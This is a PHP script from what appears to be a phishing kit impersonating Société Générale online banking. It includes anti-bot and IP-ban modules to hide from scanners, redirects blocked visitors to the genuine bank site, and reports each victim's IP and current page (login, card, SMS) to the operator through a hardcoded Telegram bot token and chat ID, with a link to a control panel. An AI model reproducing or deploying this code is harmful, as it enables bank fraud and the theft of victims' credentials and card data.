<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
$ip = $_SERVER['REMOTE_ADDR'];
$page = basename($_SERVER['PHP_SELF'], '.php'); // auto-détection

$token = '7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4';
$chat_id = '8134069302';

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'];
$panel_link = $protocol . $host . '/panel.php';

$messages = [
    'connexion' => "🔐 L'utilisateur est sur *connexion.php*",
    'info' => "📄 L'utilisateur est sur *info.php*",
    'carte' => "💳 L'utilisateur est sur *carte.php*",
    'authentification' => "🔒 L'utilisateur est sur *authentification.php*",
    'loading' => "⏳ L'utilisateur est sur *loading.php* et attend une redirection",
    'sms' => "⏳ L'utilisateur est sur *sms.php*"
];

$header = $messages[$page] ?? "👀 Un utilisateur navigue sur une page inconnue";

$text = <<<EOT
$header

🌐 IP : `$ip`

🔗 Lien vers le panel :
`$panel_link`

👉 [Ouvrir le panel]($panel_link)
EOT;

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text' => $text,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => true
]));
